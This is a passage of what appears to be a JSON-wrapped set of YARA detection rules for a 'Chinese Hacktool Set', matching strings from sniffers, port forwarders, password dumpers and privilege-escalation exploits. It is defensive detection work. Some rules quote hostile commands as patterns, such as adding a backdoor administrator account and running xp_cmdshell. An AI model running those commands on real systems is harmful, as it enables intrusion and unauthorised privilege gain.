  "HScan_v1_20_PipeCmd": "rule HScan_v1_20_PipeCmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file PipeCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"64403ce63b28b544646a30da3be2f395788542d6\"\n\tstrings:\n\t\t$s1 = \"%SystemRoot%\\\\system32\\\\PipeCmdSrv.exe\" fullword ascii\n\t\t$s2 = \"PipeCmd.exe\" fullword wide\n\t\t$s3 = \"Please Use NTCmd.exe Run This Program.\" fullword ascii\n\t\t$s4 = \"%s\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s5 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s6 = \"%s\\\\ADMIN$\\\\System32\\\\%s%s\" fullword ascii\n\t\t$s7 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n\t\t$s8 = \"Connecting to Remote Server ...Failed\" fullword ascii\n\t\t$s9 = \"PIPECMDSRV\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and 4 of them\n}",
  "Dos_fp": "rule Dos_fp {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file fp.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"41d57d356098ff55fe0e1f0bcaa9317df5a2a45c\"\n\tstrings:\n\t\t$s1 = \"fpipe -l 53 -s 53 -r 80 192.168.1.101\" fullword ascii\n\t\t$s2 = \"FPipe.exe\" fullword wide\n\t\t$s3 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s4 = \"%s %s port %d. Address is already in use\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 65KB and all of them\n}",
  "Dos_netstat": "rule Dos_netstat {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file netstat.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d0444b7bd936b5fc490b865a604e97c22d97e598\"\n\tstrings:\n\t\t$s0 = \"w03a2409.dll\" fullword ascii\n\t\t$s1 = \"Retransmission Timeout Algorithm    = unknown (%1!u!)\" fullword wide  /* Goodware String - occured 2 times */\n\t\t$s2 = \"Administrative Status  = %1!u!\" fullword wide  /* Goodware String - occured 2 times */\n\t\t$s3 = \"Packet Too Big            %1!-10u!  %2!-10u!\" fullword wide  /* Goodware String - occured 2 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and all of them\n}",
  "CN_Tools_xsniff": "rule CN_Tools_xsniff {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xsniff.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"d61d7329ac74f66245a92c4505a327c85875c577\"\n\tstrings:\n\t\t$s0 = \"xsiff.exe -pass -hide -log pass.log\" fullword ascii\n\t\t$s1 = \"HOST: %s USER: %s, PASS: %s\" fullword ascii\n\t\t$s2 = \"xsiff.exe -tcp -udp -asc -addr 192.168.1.1\" fullword ascii\n\t\t$s10 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n\t\t$s11 = \"%-5s%s->%s Bytes=%d TTL=%d Type: %d,%d ID=%d SEQ=%d\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 220KB and 2 of them\n}",
  "MSSqlPass": "rule MSSqlPass {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file MSSqlPass.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"172b4e31ed15d1275ac07f3acbf499daf9a055d7\"\n\tstrings:\n\t\t$s0 = \"Reveals the passwords stored in the Registry by Enterprise Manager of SQL Server\" wide\n\t\t$s1 = \"empv.exe\" fullword wide\n\t\t$s2 = \"Enterprise Manager PassView\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 120KB and all of them\n}",
  "WSockExpert": "rule WSockExpert {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file WSockExpert.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"2962bf7b0883ceda5e14b8dad86742f95b50f7bf\"\n\tstrings:\n\t\t$s1 = \"OpenProcessCmdExecute!\" fullword ascii\n\t\t$s2 = \"http://www.hackp.com\" fullword ascii\n\t\t$s3 = \"'%s' is not a valid time!'%s' is not a valid date and time\" fullword wide\n\t\t$s4 = \"SaveSelectedFilterCmdExecute\" fullword ascii\n\t\t$s5 = \"PasswordChar@\" fullword ascii\n\t\t$s6 = \"WSockHook.DLL\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2500KB and 4 of them\n}",
  "Ms_Viru_racle": "rule Ms_Viru_racle {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file racle.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"13116078fff5c87b56179c5438f008caf6c98ecb\"\n\tstrings:\n\t\t$s0 = \"PsInitialSystemProcess @%p\" fullword ascii\n\t\t$s1 = \"PsLookupProcessByProcessId(%u) Failed\" fullword ascii\n\t\t$s2 = \"PsLookupProcessByProcessId(%u) => %p\" fullword ascii\n\t\t$s3 = \"FirstStage() Loaded, CurrentThread @%p Stack %p - %p\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 210KB and all of them\n}",
  "lamescan3": "rule lamescan3 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file lamescan3.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3130eefb79650dab2e323328b905e4d5d3a1d2f0\"\n\tstrings:\n\t\t$s1 = \"dic\\\\loginlist.txt\" fullword ascii\n\t\t$s2 = \"Radmin.exe\" fullword ascii\n\t\t$s3 = \"lamescan3.pdf!\" fullword ascii\n\t\t$s4 = \"dic\\\\passlist.txt\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3740KB and all of them\n}",
  "CN_Tools_pc": "rule CN_Tools_pc {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pc.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5cf8caba170ec461c44394f4058669d225a94285\"\n\tstrings:\n\t\t$s0 = \"\\\\svchost.exe\" fullword ascii\n\t\t$s2 = \"%s%08x.001\" fullword ascii\n\t\t$s3 = \"Qy001Service\" fullword ascii\n\t\t$s4 = \"/.MIKY\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}",
  "Dos_Down64": "rule Dos_Down64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Down64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"43e455e43b49b953e17a5b885ffdcdf8b6b23226\"\n\tstrings:\n\t\t$s1 = \"C:\\\\Windows\\\\Temp\\\\Down.txt\" fullword wide\n\t\t$s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n\t\t$s3 = \"C:\\\\Windows\\\\Temp\\\\\" fullword wide\n\t\t$s4 = \"ProcessXElement\" fullword ascii\n\t\t$s8 = \"down.exe\" fullword wide\n\t\t$s20 = \"set_Timer1\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and all of them\n}",
  "epathobj_exp32": "rule epathobj_exp32 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file epathobj_exp32.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ed86ff44bddcfdd630ade8ced39b4559316195ba\"\n\tstrings:\n\t\t$s0 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n\t\t$s1 = \"Exploit ok run command\" fullword ascii\n\t\t$s2 = \"\\\\epathobj_exp\\\\Release\\\\epathobj_exp.pdb\" fullword ascii\n\t\t$s3 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n\t\t$s4 = \"Mutex object did not timeout, list not patched\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 270KB and all of them\n}",
  "Tools_unknown": "rule Tools_unknown {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file unknown.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4be8270c4faa1827177e2310a00af2d5bcd2a59f\"\n\tstrings:\n\t\t$s1 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n\t\t$s2 = \"GET /ok.asp?id=1__sql__ HTTP/1.1\" fullword ascii\n\t\t$s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii /* PEStudio Blacklist: agent */\n\t\t$s4 = \"Failed to clear tab control Failed to delete tab at index %d\\\"Failed to retrieve\" wide\n\t\t$s5 = \"Host: 127.0.0.1\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2500KB and 4 of them\n}",
  "PLUGIN_AJunk": "rule PLUGIN_AJunk {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file AJunk.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"eb430fcfe6d13b14ff6baa4b3f59817c0facec00\"\n\tstrings:\n\t\t$s1 = \"AJunk.dll\" fullword ascii\n\t\t$s2 = \"AJunk.DLL\" fullword wide\n\t\t$s3 = \"AJunk Dynamic Link Library\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 560KB and all of them\n}",
  "IISPutScanner": "rule IISPutScanner {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IISPutScanner.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"9869c70d6a9ec2312c749aa17d4da362fa6e2592\"\n\tstrings:\n\t\t$s2 = \"KERNEL32.DLL\" fullword ascii\n\t\t$s3 = \"ADVAPI32.DLL\" fullword ascii\n\t\t$s4 = \"VERSION.DLL\" fullword ascii\n\t\t$s5 = \"WSOCK32.DLL\" fullword ascii\n\t\t$s6 = \"COMCTL32.DLL\" fullword ascii\n\t\t$s7 = \"GDI32.DLL\" fullword ascii\n\t\t$s8 = \"SHELL32.DLL\" fullword ascii\n\t\t$s9 = \"USER32.DLL\" fullword ascii\n\t\t$s10 = \"OLEAUT32.DLL\" fullword ascii\n\t\t$s11 = \"LoadLibraryA\" fullword ascii\n\t\t$s12 = \"GetProcAddress\" fullword ascii\n\t\t$s13 = \"VirtualProtect\" fullword ascii\n\t\t$s14 = \"VirtualAlloc\" fullword ascii\n\t\t$s15 = \"VirtualFree\" fullword ascii\n\t\t$s16 = \"ExitProcess\" fullword ascii\n\t\t$s17 = \"RegCloseKey\" fullword ascii\n\t\t$s18 = \"GetFileVersionInfoA\" fullword ascii\n\t\t$s19 = \"ImageList_Add\" fullword ascii\n\t\t$s20 = \"BitBlt\" fullword ascii\n\t\t$s21 = \"ShellExecuteA\" fullword ascii\n\t\t$s22 = \"ActivateKeyboardLayout\" fullword ascii\n\t\t$s23 = \"BBABORT\" fullword wide\n\t\t$s25 = \"BBCANCEL\" fullword wide\n\t\t$s26 = \"BBCLOSE\" fullword wide\n\t\t$s27 = \"BBHELP\" fullword wide\n\t\t$s28 = \"BBIGNORE\" fullword wide\n\t\t$s29 = \"PREVIEWGLYPH\" fullword wide\n\t\t$s30 = \"DLGTEMPLATE\" fullword wide\n\t\t$s31 = \"TABOUTBOX\" fullword wide\n\t\t$s32 = \"TFORM1\" fullword wide\n\t\t$s33 = \"MAINICON\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and filesize > 350KB and all of them\n}",
  "IDTools_For_WinXP_IdtTool_2": "rule IDTools_For_WinXP_IdtTool_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IdtTool.sys\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"07feb31dd21d6f97614118b8a0adf231f8541a67\"\n\tstrings:\n\t\t$s0 = \"\\\\Device\\\\devIdtTool\" fullword wide\n\t\t$s1 = \"IoDeleteSymbolicLink\" fullword ascii  /* Goodware String - occured 467 times */\n\t\t$s3 = \"IoDeleteDevice\" fullword ascii  /* Goodware String - occured 993 times */\n\t\t$s6 = \"IoCreateSymbolicLink\" fullword ascii /* Goodware String - occured 467 times */\n\t\t$s7 = \"IoCreateDevice\" fullword ascii /* Goodware String - occured 988 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 7KB and all of them\n}",
  "hkmjjiis6": "rule hkmjjiis6 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hkmjjiis6.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4cbc6344c6712fa819683a4bd7b53f78ea4047d7\"\n\tstrings:\n\t\t$s1 = \"comspec\" fullword ascii\n\t\t$s2 = \"user32.dlly\" ascii\n\t\t$s3 = \"runtime error\" ascii\n\t\t$s4 = \"WinSta0\\\\Defau\" ascii\n\t\t$s5 = \"AppIDFlags\" fullword ascii\n\t\t$s6 = \"GetLag\" fullword ascii\n\t\t$s7 = \"* FROM IIsWebInfo\" ascii\n\t\t$s8 = \"wmiprvse.exe\" ascii\n\t\t$s9 = \"LookupAcc\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 70KB and all of them\n}",
  "Dos_lcx": "rule Dos_lcx {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file lcx.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b6ad5dd13592160d9f052bb47b0d6a87b80a406d\"\n\tstrings:\n\t\t$s0 = \"c:\\\\Users\\\\careful_snow\\\\\" ascii\n\t\t$s1 = \"Desktop\\\\Htran\\\\Release\\\\Htran.pdb\" ascii\n\t\t$s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n\t\t$s4 = \"-tran  <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n\t\t$s6 = \"=========== Code by lion & bkbll, Welcome to [url]http://www.cnhonker.com[/url] \" ascii\n\t\t$s7 = \"[-] There is a error...Create a new connection.\" fullword ascii\n\t\t$s8 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n\t\t$s11 = \"-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n\t\t$s13 = \"[+] Make a Connection to %s:%d....\" fullword ascii\n\t\t$s16 = \"-listen <ConnectPort> <TransmitPort>\" fullword ascii\n\t\t$s17 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n\t\t$s18 = \"[+] Accept a Client on port %d from %s ......\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}",
  "x_way2_5_X_way": "rule x_way2_5_X_way {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file X-way.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8ba8530fbda3e8342e8d4feabbf98c66a322dac6\"\n\tstrings:\n\t\t$s0 = \"TTFTPSERVERFRM\" fullword wide\n\t\t$s1 = \"TPORTSCANSETFRM\" fullword wide\n\t\t$s2 = \"TIISSHELLFRM\" fullword wide\n\t\t$s3 = \"TADVSCANSETFRM\" fullword wide\n\t\t$s4 = \"ntwdblib.dll\" fullword ascii\n\t\t$s5 = \"TSNIFFERFRM\" fullword wide\n\t\t$s6 = \"TCRACKSETFRM\" fullword wide\n\t\t$s7 = \"TCRACKFRM\" fullword wide\n\t\t$s8 = \"dbnextrow\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and 5 of them\n}",
  "tools_Sqlcmd": "rule tools_Sqlcmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Sqlcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"99d56476e539750c599f76391d717c51c4955a33\"\n\tstrings:\n\t\t$s0 = \"[Usage]:  %s <HostName|IP> <UserName> <Password>\" fullword ascii\n\t\t$s1 = \"=============By uhhuhy(Feb 18,2003) - http://www.cnhonker.net=============\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s4 = \"Cool! Connected to SQL server on %s successfully!\" fullword ascii\n\t\t$s5 = \"EXEC master..xp_cmdshell \\\"%s\\\"\" fullword ascii\n\t\t$s6 = \"=======================Sqlcmd v0.21 For HScan v1.20=======================\" fullword ascii\n\t\t$s10 = \"Error,exit!\" fullword ascii\n\t\t$s11 = \"Sqlcmd>\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and 3 of them\n}",
  "Sword1_5": "rule Sword1_5 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Sword1.5.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"96ee5c98e982aa8ed92cb4cedb85c7fda873740f\"\n\tstrings:\n\t\t$s3 = \"http://www.ip138.com/ip2city.asp\" fullword wide\n\t\t$s4 = \"http://www.md5decrypter.co.uk/feed/api.aspx?\" fullword wide\n\t\t$s6 = \"ListBox_Command\" fullword wide\n\t\t$s13 = \"md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack\" fullword wide\n\t\t$s18 = \"\\\\Set.ini\" fullword wide\n\t\t$s19 = \"OpenFileDialog1\" fullword wide\n\t\t$s20 = \" (*.txt)|*.txt\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 400KB and 4 of them\n}",
  "Tools_scan": "rule Tools_scan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file scan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"c580a0cc41997e840d2c0f83962e7f8b636a5a13\"\n\tstrings:\n\t\t$s2 = \"Shanlu Studio\" fullword wide\n\t\t$s3 = \"_AutoAttackMain\" fullword ascii\n\t\t$s4 = \"_frmIpToAddr\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}",
  "Dos_c": "rule Dos_c {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file c.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3deb6bd52fdac6d5a3e9a91c585d67820ab4df78\"\n\tstrings:\n\t\t$s0 = \"!Win32 .EXE.\" fullword ascii\n\t\t$s1 = \".MPRESS1\" fullword ascii\n\t\t$s2 = \".MPRESS2\" fullword ascii\n\t\t$s3 = \"XOLEHLP.dll\" fullword ascii\n\t\t$s4 = \"</body></html>\" fullword ascii\n\t\t$s8 = \"DtcGetTransactionManagerExA\" fullword ascii  /* Goodware String - occured 12 times */\n\t\t$s9 = \"GetUserNameA\" fullword ascii  /* Goodware String - occured 305 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and all of them\n}",
  "arpsniffer": "rule arpsniffer {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file arpsniffer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"7d8753f56fc48413fc68102cff34b6583cb0066c\"\n\tstrings:\n\t\t$s1 = \"SHELL\" ascii\n\t\t$s2 = \"PacketSendPacket\" fullword ascii\n\t\t$s3 = \"ArpSniff\" ascii\n\t\t$s4 = \"pcap_loop\" fullword ascii  /* Goodware String - occured 3 times */\n\t\t$s5 = \"packet.dll\" fullword ascii  /* Goodware String - occured 4 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 120KB and all of them\n}",
  "pw_inspector_2": "rule pw_inspector_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pw-inspector.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e0a1117ee4a29bb4cf43e3a80fb9eaa63bb377bf\"\n\tstrings:\n\t\t$s1 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n\t\t$s2 = \"Syntax: %s [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p \" ascii\n\t\t$s3 = \"PW-Inspector\" fullword ascii\n\t\t$s4 = \"i:o:m:M:c:lunps\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}",
  "datPcShare": "rule datPcShare {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file datPcShare.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"87acb649ab0d33c62e27ea83241caa43144fc1c4\"\n\tstrings:\n\t\t$s1 = \"PcShare.EXE\" fullword wide\n\t\t$s2 = \"MZKERNEL32.DLL\" fullword ascii\n\t\t$s3 = \"PcShare\" fullword wide\n\t\t$s4 = \"QQ:4564405\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and all of them\n}",
  "Tools_xport": "rule Tools_xport {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xport.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"9584de562e7f8185f721e94ee3cceac60db26dda\"\n\tstrings:\n\t\t$s1 = \"Match operate system failed, 0x%00004X:%u:%d(Window:TTL:DF)\" fullword ascii\n\t\t$s2 = \"Example: xport www.xxx.com 80 -m syn\" fullword ascii\n\t\t$s3 = \"%s - command line port scanner\" fullword ascii\n\t\t$s4 = \"xport 192.168.1.1 1-1024 -t 200 -v\" fullword ascii\n\t\t$s5 = \"Usage: xport <Host> <Ports Scope> [Options]\" fullword ascii\n\t\t$s6 = \".\\\\port.ini\" fullword ascii\n\t\t$s7 = \"Port scan complete, total %d port, %d port is opened, use %d ms.\" fullword ascii\n\t\t$s8 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n\t\t$s9 = \"http://www.xfocus.org\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}",
  "Pc_xai": "rule Pc_xai {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xai.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f285a59fd931ce137c08bd1f0dae858cc2486491\"\n\tstrings:\n\t\t$s1 = \"Powered by CoolDiyer @ C.Rufus Security Team 05/19/2008  http://www.xcodez.com/\" fullword wide\n\t\t$s2 = \"%SystemRoot%\\\\System32\\\\\" fullword ascii\n\t\t$s3 = \"%APPDATA%\\\\\" fullword ascii\n\t\t$s4 = \"---- C.Rufus Security Team ----\" fullword wide\n\t\t$s5 = \"www.snzzkz.com\" fullword wide\n\t\t$s6 = \"%CommonProgramFiles%\\\\\" fullword ascii\n\t\t$s7 = \"GetRand.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}",
  "Radmin_Hash": "rule Radmin_Hash {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Radmin_Hash.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"be407bd5bf5bcd51d38d1308e17a1731cd52f66b\"\n\tstrings:\n\t\t$s1 = \"<description>IEBars</description>\" fullword ascii\n\t\t$s2 = \"PECompact2\" fullword ascii\n\t\t$s3 = \"Radmin, Remote Administrator\" fullword wide\n\t\t$s4 = \"Radmin 3.0 Hash \" fullword wide\n\t\t$s5 = \"HASH1.0\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 600KB and all of them\n}",
  "OSEditor": "rule OSEditor {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file OSEditor.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6773c3c6575cf9cfedbb772f3476bb999d09403d\"\n\tstrings:\n\t\t$s1 = \"OSEditor.exe\" fullword wide\n\t\t$s2 = \"netsafe\" wide\n\t\t$s3 = \"OSC Editor\" fullword wide\n\t\t$s4 = \"GIF89\" ascii\n\t\t$s5 = \"Unlock\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and all of them\n}",
  "GoodToolset_ms11011": "rule GoodToolset_ms11011 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11011.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5ad7a4962acbb6b0e3b73d77385eb91feb88b386\"\n\tstrings:\n\t\t$s0 = \"\\\\i386\\\\Hello.pdb\" ascii\n\t\t$s1 = \"OS not supported.\" fullword ascii\n\t\t$s3 = \"Not supported.\" fullword wide  /* Goodware String - occured 3 times */\n\t\t$s4 = \"SystemDefaultEUDCFont\" fullword wide  /* Goodware String - occured 18 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and all of them\n}",
  "FreeVersion_release": "rule FreeVersion_release {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file release.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f42e4b5748e92f7a450eb49fc89d6859f4afcebb\"\n\tstrings:\n\t\t$s1 = \"-->Got WMI process Pid: %d \" ascii\n\t\t$s2 = \"This exploit will execute \\\"net user \" ascii\n\t\t$s3 = \"net user temp 123456 /add & net localgroup administrators temp /add\" fullword ascii\n\t\t$s4 = \"Running reverse shell\" ascii\n\t\t$s5 = \"wmiprvse.exe\" fullword ascii\n\t\t$s6 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 3 of them\n}",
  "churrasco": "rule churrasco {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file churrasco.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a8d4c177948a8e60d63de9d0ed948c50d0151364\"\n\tstrings:\n\t\t$s1 = \"Done, command should have ran as SYSTEM!\" ascii\n\t\t$s2 = \"Running command with SYSTEM Token...\" ascii\n\t\t$s3 = \"Thread impersonating, got NETWORK SERVICE Token: 0x%x\" ascii\n\t\t$s4 = \"Found SYSTEM token 0x%x\" ascii\n\t\t$s5 = \"Thread not impersonating, looking for another thread...\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and 2 of them\n}",
  "x64_KiwiCmd": "rule x64_KiwiCmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file KiwiCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"569ca4ff1a5ea537aefac4a04a2c588c566c6d86\"\n\tstrings:\n\t\t$s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n\t\t$s2 = \"Kiwi Cmd no-gpo\" fullword wide\n\t\t$s3 = \"KiwiAndCMD\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 400KB and 2 of them\n}",
